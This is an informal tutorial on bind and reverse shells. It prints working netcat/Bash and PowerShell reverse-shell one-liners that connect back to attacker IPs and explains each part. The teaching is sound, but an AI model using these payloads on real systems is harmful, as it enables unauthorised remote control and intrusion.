
The shell is basically a tool that lets you talk to your computer using commands, kinda like chatting with your OS. There are different kinds of shells depending on what operating system you're using. Even though each OS might have its own way of talking to the shell, there are some universal ways to communicate, like using Python, JavaScript, or Visual Basic.

Hackers might try to sneak in their own commands and scripts through these methods to get a foothold in your system. Knowing what kind of command language interpreter is being used on a system can help you figure out who might be trying to exploit it.
## Hands on Terminal

For beginners, it's key to figure out what kind of interpreter you're working with. You'll often see the `$` sign in interpreters like Bash, POSIX, and ksh, and lots of other shell interpreters too. If you wanna up your security game, you can...
### shell validation `ps`
```bash
ps

    PID TTY          TIME CMD
   4232 pts/1    00:00:00 bash
  11435 pts/1    00:00:00 ps
```

How about we catch the interpreter more frequently?
### shell validating `env`

```
env

SHELL=/bin/bash
```

## Bind Shells

-----

Alright, so our main goal here is to figure out who these attackers are and what they're doing to get into the target computer or network. To do that, I like to get a shell. The most common way to do this is by using either a bind shell or a reverse shell.

- Bind shell: In this method, we, as the bad guys, start the connection, and the victim just waits there to accept our connection.

- Reverse shell: This is kind of the opposite. We can run commands on a remote machine and then send the connection back to our own machine while we're waiting for it.

Now, with the Bind Shell approach, there are a few tricky parts to getting a shell this way. Here are some of them:

- A listener needs to be already running on the target.
- If no listener is set up, we gotta figure out how to get one started.
- Usually, admins put tight restrictions on incoming traffic and stuff like NAT (with PAT) at the edge of the network (the part facing the public internet), so we'd need to be inside the network already.
- The firewalls built into Windows and Linux can block most incoming connections unless they're linked to trusted apps.

Setting up a shell might be tricky because we gotta think about IP addresses, ports, and the tool we're using to make sure our connection works smoothly.
### Practices with netcat 

#### No. 1: Server - Target starting Netcat listener

  

```shell-session
Target@server:~$ nc -lvnp 7777

Listening on [0.0.0.0] (family 0, port 7777)
```

In this instance, the target will be our server, and the attack box will be our client. Once we hit enter, the listener is started and awaiting a connection from the client.

Back on the client (attack box), we will use nc to connect to the listener we started on the server.

#### No. 2: Client - Attack box connecting to target

```
nc -nv 10.129.41.200 7777

Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
```

On the client-side, we specify the server's IP address and the port that we configured to listen on (`7777`). Once we successfully connect, we can see a `succeeded!` message.

### Establishing a Basic Bind Shell with Netcat

On the server-side, we will need to specify the `directory`, `shell`, `listener`, work with some `pipelines`, and `input` & `output` `redirection` to ensure a shell to the system gets served when the client attempts to connect.

 

```shell-session
Target@server:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

The commands above are considered our payload, and we delivered this payload manually. We will notice that the commands and code in our payloads will differ depending on the host operating system we are delivering it to.

Back on the client, use Netcat to connect to the server now that a shell on the server is being served.

#### No. 2: Client - Connecting to bind shell on target
```shell-session
nc -nv 10.129.41.200 7777

Target@server:~$  
```

We worked through these exercises to understand the basics of the bind shell and how it works without any security controls (NAT-enabled routers, hardware firewalls, Web Application Firewalls, IDS, IPS, OS firewalls, endpoint protection, authentication mechanisms, etc.) in place or exploits needed.

## Reverse Shells

---


A **reverse shell** is basically when a hacker gets into your computer and sets up a secret line of communication back to their own computer. It's like they're creating a hidden backdoor so they can keep controlling your system from afar.
### How Does It Work?

1. **Listener Setup**: The hacker sets up a program on their own computer that waits for incoming connections – kind of like a digital bouncer waiting for guests to arrive.

2. **Initiation by Target**: Instead of the hacker making the first move like in regular situations, here the messed-up system (the target) reaches out and connects back to the hacker's machine. It's like the target is calling the shots!

3. **Command Execution**: Once the connection is all set up, the hacker can control the target system as if they were sitting right in front of it. It's like having a remote control for someone else's computer!
### Why Use Reverse Shells?

Reverse shells are super handy when you're trying to get into a system without raising too many red flags. Instead of going straight in, which could set off alarms, the target starts the connection, making it less likely for firewalls or those pesky intrusion detection systems to block us.

When it comes to the payloads (commands and code) we use to create these reverse shells, we don't always have to start from scratch. There are some awesome tools out there that security pros have whipped up to make our lives easier. The [Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) is a great resource with all sorts of commands, code snippets, and even automated tools for setting up reverse shells. Just remember, though, that many system admins are familiar with these public resources and open-source tools that pentesters often use. They might check these out to anticipate what an attacker could do and beef up their defenses. Sometimes, we might need to tweak our approach a bit to stay one step ahead.
## Introduction to Payloads
----


So, a payload in cybersecurity is basically the bad stuff that hackers use to mess with your system or network. It's like the actual harmful code or data they bring along to achieve their goals, whether that's stealing your info, causing chaos, or damaging things. Knowing about these payloads is super important for both the good guys trying to protect systems and the bad guys planning attacks.

### Types of Payloads 

1. **Trojan Horses**: These are sneaky programs that pretend to be helpful but actually do nasty stuff like stealing your info or letting bad guys in.

2. **Viruses**: Unlike Trojan horses, these little buggers can make copies of themselves and spread around. Once they infect a system, they usually bring trouble with them.

3. **Worms**: These are like the virus, but they're super good at traveling through networks without needing any help from humans. They can cause chaos by stealing data or messing up systems.

4. **Ransomware**: This type of payload is all about money. It locks up your files and demands cash to unlock them again. The goal is simple: get paid by the bad guys.

5. **Rootkits**: These are super stealthy and give attackers full control over a system. They can hide themselves, steal your data, or even take over your computer remotely.

6. **Logic Bombs**: These payloads are like ticking time bombs. They're set to go off under certain conditions, like a specific date or after a certain number of times they've been run. When they explode, they can cause serious damage.

### Payload Delivery Methods

Payloads can be delivered through various means, including:

- Email attachments
- Malicious websites
- Exploiting software vulnerabilities
- Social engineering tactics


### One-Liners Examined

#### Netcat/Bash Reverse Shell One-liner

```shell-session
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
```

Alright, so the commands above are basically like a one-liner you might hear on a Linux system to set up a Bash shell over a network socket using something called Netcat. We touched on this way back in the Bind Shells section. It's something people usually just copy and paste without really getting what it does. But let's break it down piece by piece, shall we?

#### Remove /tmp/f

```shell-session
rm -f /tmp/f; 
```

So, if the `/tmp/f` file is hanging around, we'll just go ahead and delete it with `rm`. And don't worry if it ain't there—the `-f` flag tells `rm` to chill out and not freak out if the file's MIA. Plus, we're using a semi-colon to make sure these commands happen one after the other, like a boss!

#### Make A Named Pipe


```shell-session
mkfifo /tmp/f; 
```

Creates a FIFO named pipe file at the spot you tell it to. Here, /tmp/f is the named pipe file, and the semicolon (`;`) helps run the command one after the other.

#### Output Redirection


```shell-session
cat /tmp/f | 
```

Joins up the FIFO named pipe file at /tmp/f, and then uses the pipe (`|`) to link the normal output of cat /tmp/f with the normal input of whatever command comes after the pipe (`|`).
#### Set Shell Options


```shell-session
/bin/bash -i 2>&1 | 
```

So, you're telling the computer to use this command language interpreter with the `-i` option to make sure it's all interactive. And the `2>&1` part is just redirecting both error messages and regular output to whatever command comes next in the pipeline.
#### Open a Connection with Netcat


```shell-session
nc 10.10.14.12 7777 > /tmp/f  
```

Alright, let's break it down in simpler terms. We're using Netcat to connect to a host that's set up for our attack, which is `10.10.14.12`, and it's listening on port `7777`. Once we make the connection, the output gets sent to a file in `/tmp` called `f`. This sets up a backdoor Bash shell that our Netcat listener is waiting for. When everything's all set, we run this one-liner command to open the reverse shell.

### PowerShell One-liner Explained

The shells and payloads we pick totally depend on the OS we're targeting. Keep this in mind as we go through the module. Remember when we did the reverse shells? We set up a reverse shell with a Windows system using PowerShell. Let's break down that one-liner we used, shall we?

#### Powershell One-liner


```cmd-session
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Let's break down that huge PowerShell command up there, shall we? It might seem like a mouthful, but we'll try to make it less scary and more understandable.
#### Calling PowerShell


```cmd-session
powershell -nop -c 
```

Alright, so basically, you're using `powershell.exe` without any profile settings (`nop`) and then running a command or script (`-c`) inside the quotes. This whole thing is done from the command prompt, which is why PowerShell starts the command. Knowing this is handy if we find a Remote Code Execution issue that lets us run commands straight in `cmd.exe`.

#### Binding A Socket


```cmd-session
"$client = New-Object System.Net.Sockets.TCPClient(10.10.14.158,443);
```

Alright, so we're setting this thing called `$client` to be a new object made by the `New-Object` cmdlet. This object is from the .NET framework and it's specifically for handling TCP connections. We're using it to connect to a TCP socket at the address 10.10.14.158 on port 443. The semi-colon at the end just makes sure everything runs in order.

#### Setting The Command Stream


```cmd-session
$stream = $client.GetStream();
```

Alright, so we're setting this thing called `$stream` to be the same as `$client` and then using this .NET framework method called `GetStream`. This helps with network communications. And the semi-colon at the end makes sure everything runs in order.
#### Empty Byte Stream

```cmd-session
[byte[]]$bytes = 0..65535|%{0}; 
```

Alright, so we're making a byte array named `$bytes` that's filled with 65,535 zeros. Think of it like a blank slate or an empty pipeline that'll be sent to a listening TCP server on some target machine waiting for a connection.

#### Stream Parameters


```cmd-session
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
```

Keep a loop running with `$i` set to the result of the .NET framework's `$stream.Read` method. Inside the parentheses, you'll need to specify the buffer (`$bytes`), the offset (`0`), and the count (`$bytes.Length`).
#### Set The Byte Encoding


```cmd-session
{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
```

Alright, so we're setting this thing called `$data` to this ASCII encoding class from the .NET framework. We're gonna use it with the `GetString` method to turn our byte stream (`$bytes`) into readable ASCII text. Basically, instead of just sending and receiving raw bits, we're making sure what we type gets turned into proper ASCII text. And the semi-colon (`;`) makes sure all our commands and code run one after the other.

#### Invoke-Expression


```cmd-session
$sendback = (iex $data 2>&1 | Out-String ); 
```

Alright, let's break it down in simpler terms:

We're setting up a variable called `$sendback`. We're using a command called `Invoke-Expression`, or `iex` for short, to run whatever's inside the `$data` variable on our own computer. 

Now, when we run this command, it might spit out some error messages and regular output. We don't want those to just pop up on the screen, so we're redirecting them through a pipe (`|`) to another command called `Out-String`. This command takes whatever the `Invoke-Expression` gives us and turns it into plain text strings.

The semi-colon (`;`) at the end is just there to make sure all these commands are run one after the other, in order.

#### Show Working Directory


```cmd-session
$sendback2 = $sendback + 'PS ' + (pwd).path + '> '; 
```

Alright, let's break it down. We're setting this thing called `$sendback2` to be equal to `$sendback`, then we're adding the string 'PS', followed by the path to where our program is working right now, and finally, we tack on '> ' to make it look like a shell prompt. So, you'll end up with something like "PS C:\workingdirectoryofmachine >". The semi-colon at the end just makes sure everything runs one after the other. And remember, when we use the '+' sign in this context, it's like gluing strings together, unless we're dealing with numbers in languages like C or C++, where we need a special function for that.
#### Sets Sendbyte


```cmd-session
$sendbyte=  ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}
```

Set `$sendbyte` to the ASCII encoded byte stream that'll fire up a TCP client to start a PowerShell session with a Netcat listener on the target box.
#### Terminate TCP Connection


```cmd-session
$client.Close()"
```

Alright, so this `TcpClient.Close` thing is what we'll use when we need to shut down the connection.

